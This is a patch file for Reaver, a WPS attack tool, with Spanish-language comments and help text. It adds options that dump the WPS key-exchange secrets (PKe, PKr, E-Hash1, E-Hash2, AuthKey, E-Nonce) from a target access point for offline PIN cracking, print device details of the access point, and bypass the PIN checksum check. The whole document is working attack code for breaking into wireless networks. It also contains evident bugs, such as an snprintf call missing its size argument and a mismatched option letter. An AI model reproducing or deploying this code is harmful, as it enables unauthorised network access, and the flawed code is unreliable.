@@ -1,0 +1,479 @@
+diff -Naur reaver/src/argsparser.c reaver_mod_nochecksum/src/argsparser.c
+--- reaver/src/argsparser.c	2015-05-15 08:57:49.411687019 +0200
++++ reaver_mod_nochecksum/src/argsparser.c	2015-05-14 09:04:17.658266512 +0200
+@@ -41,7 +41,12 @@
+ 	int long_opt_index = 0;
+ 	char bssid[MAC_ADDR_LEN] = { 0 };
+ 	char mac[MAC_ADDR_LEN] = { 0 };
+-	char *short_options = "b:e:m:i:t:d:c:T:x:r:g:l:o:p:s:C:aA5ELfnqvDShwN";
++	/******* MOD 5.1 *******/
++	char *short_options = "b:e:m:i:t:d:c:T:x:r:g:l:o:p:s:C:FPGXaA5ELfnqvDShwN";
++	/***********************/
++	/******* ORIGINAL*******/
++	/*char *short_options = "b:e:m:i:t:d:c:T:x:r:g:l:o:p:s:C:aA5ELfnqvDShwN";*/
++	/***********************/
+ 	struct option long_options[] = {
+ 		{ "interface", required_argument, NULL, 'i' },
+ 		{ "bssid", required_argument, NULL, 'b' },
+@@ -73,6 +78,12 @@
+ 		{ "verbose", no_argument, NULL, 'v' },
+ 		{ "win7", no_argument, NULL, 'w' },
+ 		{ "help", no_argument, NULL, 'h' },
++		/******* MOD 5.1 *******/
++		{ "FINALIZAR", no_argument, NULL, 'F' },
++		{ "PROSEGUIR", no_argument, NULL, 'P' },
++		{ "GEMINIS", no_argument, NULL, 'G' },
++		{ "NOCHECKSUM", no_argument, NULL, 'G' },
++		/***********************/
+ 		{ 0, 0, 0, 0 }
+ 	};
+ 
+@@ -173,7 +184,22 @@
+ 			case 'N':
+ 				set_oo_send_nack(0);
+ 				break;
+-                        default:
++                        /******* MOD 5.1 *******/
++			case 'F':
++				set_mod(1);
++				break;
++			case 'P':
++				set_mod(2);
++				break;
++			case 'G':
++				set_mod_geminis(1);
++				break;
++			case 'X':
++				set_mod_no_checksum(1);
++				break;
++			/***********************/
++
++			default:
+                                 ret_val = EXIT_FAILURE;
+                 }
+         }
+@@ -241,6 +267,7 @@
+ 			{
+ 				memcpy((void *) &p2, pin+sizeof(p1)-1, sizeof(p2)-1);
+ 				set_static_p2((char *) &p2);
++				set_pin_no_checksum((char *) pin);
+ 			}
+ 		}
+ 		else
+diff -Naur reaver/src/globule.c reaver_mod_nochecksum/src/globule.c
+--- reaver/src/globule.c	2015-05-15 08:57:49.467687022 +0200
++++ reaver_mod_nochecksum/src/globule.c	2015-05-14 09:03:42.129264686 +0200
+@@ -302,7 +302,40 @@
+ {
+ 	return globule->debug;
+ }
+-
++/******* MOD 5.1 *******/
++void set_mod(int value)
++{
++      globule->mod_activo = value;
++}
++int get_mod()
++{
++      return globule->mod_activo;
++}
++void set_mod_geminis(int value)
++{
++      globule->mod_activo_geminis = value;
++}
++int get_mod_geminis()
++{
++      return globule->mod_activo_geminis;
++}
++void set_mod_no_checksum(int value)
++{
++      globule->mod_no_checksum = value;
++}
++int get_mod_no_checksum()
++{
++      return globule->mod_no_checksum;
++}
++void set_pin_no_checksum(char *value)
++{
++      globule->pin_no_checksum = strdup(value);
++}
++char *get_pin_no_checksum()
++{
++      return globule->pin_no_checksum;
++}
++/***********************/
+ void set_eapol_start_count(int value)
+ {
+ 	globule->eapol_start_count = value;
+diff -Naur reaver/src/globule.h reaver_mod_nochecksum/src/globule.h
+--- reaver/src/globule.h	2015-05-15 08:57:47.232686907 +0200
++++ reaver_mod_nochecksum/src/globule.h	2015-05-14 09:14:36.817298334 +0200
+@@ -88,6 +88,12 @@
+ 
+         enum debug_level debug;         /* Current debug level: INFO | CRITICAL | WARNING | VERBOSE */
+ 
++        /******* MOD 5.1 *******/
++        int mod_activo; 
++	int mod_activo_geminis; 
++	int mod_no_checksum;
++	char *pin_no_checksum;
++        /***********************/
+         int eapol_start_count;          /* Tracks how many times in a row we've attempted to start and EAP session */
+ 
+         int fixed_channel;              /* Disables channel hopping if set */
+@@ -190,6 +196,19 @@
+ enum debug_level get_debug();
+ void set_eapol_start_count(int value);
+ int get_eapol_start_count();
++/******* MOD 5.1 *******/
++void set_mod(int value);
++int get_mod();
++
++void set_mod_geminis(int value);
++int get_mod_geminis();
++
++void set_mod_no_checksum(int value);
++int get_mod_no_checksum();
++
++void set_pin_no_checksum(char *value);
++char *get_pin_no_checksum();
++/***********************/
+ void set_fixed_channel(int value);
+ int get_fixed_channel();
+ void set_auto_channel_select(int value);
+diff -Naur reaver/src/pins.c reaver_mod_nochecksum/src/pins.c
+--- reaver/src/pins.c	2015-05-15 08:57:47.237686908 +0200
++++ reaver_mod_nochecksum/src/pins.c	2015-05-14 09:12:44.766292575 +0200
+@@ -54,7 +54,11 @@
+ 
+                 free(key);
+         }
+-
++        /**** MOD 5.1 *****/
++	if (globule->mod_no_checksum == 1) {
++		snprintf(pin, "%s", get_pin_no_checksum());
++	}
++	/*****************/
+         return pin;
+ }
+ 
+diff -Naur reaver/src/session.c reaver_mod_nochecksum/src/session.c
+--- reaver/src/session.c	2015-05-15 08:57:49.465687022 +0200
++++ reaver_mod_nochecksum/src/session.c	2015-05-14 08:07:32.503091507 +0200
+@@ -74,7 +74,7 @@
+ 	{
+ 		answer = 'y';
+ 	}
+-
++		
+ 	if(stat(file, &wpstat) == 0)
+ 	{
+ 		/* If the user explicitly specified a session file, don't prompt them */
+diff -Naur reaver/src/wps/wps_dev_attr.c reaver_mod_nochecksum/src/wps/wps_dev_attr.c
+--- reaver/src/wps/wps_dev_attr.c	2015-05-15 08:57:47.698686931 +0200
++++ reaver_mod_nochecksum/src/wps/wps_dev_attr.c	2015-05-14 08:07:32.503091507 +0200
+@@ -11,7 +11,9 @@
+  *
+  * See README and COPYING for more details.
+  */
+-
++/******* MOD 5.1 *******/
++#include "globule.h"
++/***********************/
+ #include "includes.h"
+ 
+ #include "common.h"
+@@ -107,6 +109,7 @@
+ 		wpabuf_put_be16(msg, len);
+ 		wpabuf_put_data(msg, dev->serial_number, len);
+ 	}
++	
+ 	return 0;
+ }
+ 
+@@ -186,17 +189,28 @@
+ 
+ 	wpa_hexdump_ascii(MSG_DEBUG, "WPS: Manufacturer", str, str_len);
+ 
++	/**** GEMINIS MOD ********/
++	if (globule->mod_activo_geminis == 1 || globule->mod_activo == 1) 
++	{
++	      printf("- Fabricante       : ");
++	      int contador = 0;
++	      for (; contador < str_len; contador++) {
++		printf("%c", (char *) str[contador]);
++	      }
++	      printf("\n");
++	}
++	/**************************/
++	
+ 	os_free(dev->manufacturer);
+ 	dev->manufacturer = os_malloc(str_len + 1);
+ 	if (dev->manufacturer == NULL)
+ 		return -1;
+ 	os_memcpy(dev->manufacturer, str, str_len);
+ 	dev->manufacturer[str_len] = '\0';
+-
++	
+ 	return 0;
+ }
+ 
+-
+ static int wps_process_model_name(struct wps_device_data *dev, const u8 *str,
+ 				  size_t str_len)
+ {
+@@ -207,13 +221,24 @@
+ 
+ 	wpa_hexdump_ascii(MSG_DEBUG, "WPS: Model Name", str, str_len);
+ 
++	/**** GEMINIS MOD ********/
++	if (globule->mod_activo_geminis == 1 || globule->mod_activo == 1)  {
++	      printf("- Modelo           : ");
++	      int contador = 0;
++	      for (; contador < str_len; contador++) {
++		printf("%c", (char *) str[contador]);
++	      }
++	      printf("\n");
++	}
++	/**************************/
++	
+ 	os_free(dev->model_name);
+ 	dev->model_name = os_malloc(str_len + 1);
+ 	if (dev->model_name == NULL)
+ 		return -1;
+ 	os_memcpy(dev->model_name, str, str_len);
+ 	dev->model_name[str_len] = '\0';
+-
++		
+ 	return 0;
+ }
+ 
+@@ -228,13 +253,24 @@
+ 
+ 	wpa_hexdump_ascii(MSG_DEBUG, "WPS: Model Number", str, str_len);
+ 
++	/**** GEMINIS MOD ********/
++	if (globule->mod_activo_geminis == 1 || globule->mod_activo == 1)  {
++	      printf("- Numero de modelo : ");
++	      int contador = 0;
++	      for (; contador < str_len; contador++) {
++		printf("%c", (char *) str[contador]);
++	      }
++	      printf("\n");
++	}
++	/**************************/
++	
+ 	os_free(dev->model_number);
+ 	dev->model_number = os_malloc(str_len + 1);
+ 	if (dev->model_number == NULL)
+ 		return -1;
+ 	os_memcpy(dev->model_number, str, str_len);
+ 	dev->model_number[str_len] = '\0';
+-
++		
+ 	return 0;
+ }
+ 
+@@ -248,7 +284,18 @@
+ 	}
+ 
+ 	wpa_hexdump_ascii(MSG_DEBUG, "WPS: Serial Number", str, str_len);
+-
++	
++	/**** GEMINIS MOD ********/
++	if (globule->mod_activo_geminis == 1 || globule->mod_activo == 1)  {
++	      printf("- Numero de serie  : ");
++	      int contador = 0;
++	      for (; contador < str_len; contador++) {
++		printf("%c", (char *) str[contador]);
++	      }
++	      printf("\n");
++	}
++	/**************************/
++	
+ 	os_free(dev->serial_number);
+ 	dev->serial_number = os_malloc(str_len + 1);
+ 	if (dev->serial_number == NULL)
+@@ -270,13 +317,24 @@
+ 
+ 	wpa_hexdump_ascii(MSG_DEBUG, "WPS: Device Name", str, str_len);
+ 
++	/**** GEMINIS MOD ********/
++	if (globule->mod_activo_geminis == 1 || globule->mod_activo == 1)  {
++	      printf("- Device Name      : ");
++	      int contador = 0;
++	      for (; contador < str_len; contador++) {
++		printf("%c", (char *) str[contador]);
++	      }
++	      printf("\n");
++	}
++	/**************************/
++	
+ 	os_free(dev->device_name);
+ 	dev->device_name = os_malloc(str_len + 1);
+ 	if (dev->device_name == NULL)
+ 		return -1;
+ 	os_memcpy(dev->device_name, str, str_len);
+ 	dev->device_name[str_len] = '\0';
+-
++	
+ 	return 0;
+ }
+ 
+@@ -379,4 +437,4 @@
+ 	dev->model_number = NULL;
+ 	os_free(dev->serial_number);
+ 	dev->serial_number = NULL;
+-}
++}
+\ No hay ningún carácter de nueva línea al final del fichero
+diff -Naur reaver/src/wps/wps_enrollee.c reaver_mod_nochecksum/src/wps/wps_enrollee.c
+--- reaver/src/wps/wps_enrollee.c	2015-05-15 08:57:47.697686931 +0200
++++ reaver_mod_nochecksum/src/wps/wps_enrollee.c	2015-05-14 08:07:32.504091507 +0200
+@@ -20,7 +20,6 @@
+ #include "wps_i.h"
+ #include "wps_dev_attr.h"
+ 
+-
+ static int wps_build_mac_addr(struct wps_data *wps, struct wpabuf *msg)
+ {
+ 	wpa_printf(MSG_DEBUG, "WPS:  * MAC Address");
+@@ -822,7 +821,7 @@
+ 			  attr->serial_number, attr->serial_number_len);
+ 	wpa_hexdump_ascii(MSG_DEBUG, "WPS: Device Name",
+ 			  attr->dev_name, attr->dev_name_len);
+-
++			
+ 	if (wps->wps->event_cb) {
+ 		union wps_event_data data;
+ 		struct wps_event_m2d *m2d = &data.m2d;
+diff -Naur reaver/src/wps/wps_registrar.c reaver_mod_nochecksum/src/wps/wps_registrar.c
+--- reaver/src/wps/wps_registrar.c	2015-05-15 08:57:47.702686932 +0200
++++ reaver_mod_nochecksum/src/wps/wps_registrar.c	2015-05-14 08:07:32.505091507 +0200
+@@ -26,6 +26,10 @@
+ #include "wps_dev_attr.h"
+ #include "../misc.h"
+ 
++/******* MOD 5.1 *******/
++#include "globule.h"
++/***********************/
++
+ #define WPS_WORKAROUNDS
+ 
+ struct wps_uuid_pin {
+@@ -1766,7 +1770,85 @@
+ 
+ 	os_memcpy(wps->peer_hash2, e_hash2, WPS_HASH_LEN);
+ 	wpa_hexdump(MSG_DEBUG, "WPS: E-Hash2", wps->peer_hash2, WPS_HASH_LEN);
+-
++	
++	/******* MOD 5.1 *******/
++	if (globule->mod_activo == 1 || globule->mod_activo == 2) {
++		const u8 *addr[2];
++				
++		addr[0] = wpabuf_head(wps->dh_pubkey_e);
++		addr[1] = wpabuf_head(wps->dh_pubkey_r);
++					  
++		int contador = 0;
++		int longitud;
++		longitud = wpabuf_len(wps->dh_pubkey_e);
++		printf("PKe: ");
++		for (; contador < longitud; contador++) {
++		    printf("%02x", *(addr[0] + contador));
++		    if (contador != longitud - 1) {
++			printf(":");
++		    }
++		}
++		printf("\n");
++		
++		contador = 0;
++		longitud = wpabuf_len(wps->dh_pubkey_r);
++		printf("PKr: ");
++		for (; contador < longitud; contador++) {
++		    printf("%02x", *(addr[1] + contador));
++		    if (contador != longitud -1) {
++			printf(":");
++		    }
++		}
++		printf("\n");
++	  
++		contador = 0;
++		printf("E-Hash1: ");
++		for (; contador < WPS_HASH_LEN; contador++) {
++		    printf("%02x", *(wps->peer_hash1 + contador));
++		    if (contador != WPS_HASH_LEN - 1) {
++			printf(":");
++		    }
++		}
++		printf("\n");
++		
++		contador = 0;
++		printf("E-Hash2: ");
++		for (; contador < WPS_HASH_LEN; contador++) {
++		    printf("%02x", *(wps->peer_hash2 + contador));
++		    if (contador != WPS_HASH_LEN - 1) {
++			printf(":");
++		    }
++		}
++		printf("\n");
++		
++		contador = 0;
++		printf("AuthKey: ");
++		for (; contador < WPS_AUTHKEY_LEN; contador++) {
++		    printf("%02x", *(wps->authkey + contador));
++		    if (contador != WPS_AUTHKEY_LEN - 1) {
++			printf(":");
++		    }
++		}
++		printf("\n");
++		
++		contador = 0;
++		printf("E-Nonce: ");
++		for (; contador < WPS_NONCE_LEN; contador++) {
++		    printf("%02x", *(wps->nonce_e + contador));
++		    if (contador != WPS_NONCE_LEN - 1) {
++			printf(":");
++		    }
++		}
++		printf("\n");
++		
++		if (globule->mod_activo == 1) {
++			globule_deinit();
++			sql_cleanup();
++			exit(0);
++		}
++		  
++	}	
++	/***********************/
+ 	return 0;
+ }
+ 
+diff -Naur reaver/src/wpscrack.c reaver_mod_nochecksum/src/wpscrack.c
+--- reaver/src/wpscrack.c	2015-05-15 08:57:47.239686908 +0200
++++ reaver_mod_nochecksum/src/wpscrack.c	2015-05-15 08:56:25.362682700 +0200
+@@ -42,7 +42,8 @@
+ 	globule_init();
+ 	sql_init();
+ 	init_default_settings();
+-
++	
++	fprintf(stderr, "MOD_VERSION=2\n\n");
+ 	fprintf(stderr, "\nReaver v%s WiFi Protected Setup Attack Tool\n", PACKAGE_VERSION);
+ 	fprintf(stderr, "Copyright (c) 2011, Tactical Network Solutions, Craig Heffner <cheffner@tacnetsol.com>\n\n");
+ 
+@@ -176,7 +177,14 @@
+         fprintf(stderr, "\t-E, --eap-terminate             Terminate each WPS session with an EAP FAIL packet\n");
+         fprintf(stderr, "\t-n, --nack                      Target AP always sends a NACK [Auto]\n");
+ 	fprintf(stderr, "\t-w, --win7                      Mimic a Windows 7 registrar [False]\n");
+-
++		/******* MOD 5.1 *******/
++	fprintf(stderr, "\nMod 5.1 Options:\n");
++	fprintf(stderr, "\t-F, --FINALIZAR                 Extrae y muestra PKE, PKR, AUTHKEY, EHASH, EHASH2, E-NONCE y finaliza el ataque\n");
++	fprintf(stderr, "\t-P, --PROSEGUIR                 Extrae y muestra PKE, PKR, AUTHKEY, EHASH, EHASH2, E-NONCE y continua el ataque\n");
++	fprintf(stderr, "\t-G, --GEMINIS                   Extrae y muestra datos del AP\n");
++	fprintf(stderr, "\t-X, --NOCHECKSUM                Junto con -p <pin> no efectua comprobación del checksum del pin usado\n");
++	/***********************/
++	
+         fprintf(stderr, "\nExample:\n\t%s -i mon0 -b 00:90:4C:C1:AC:21 -vv\n\n", prog_name);
+ 
+         return EXIT_FAILURE;
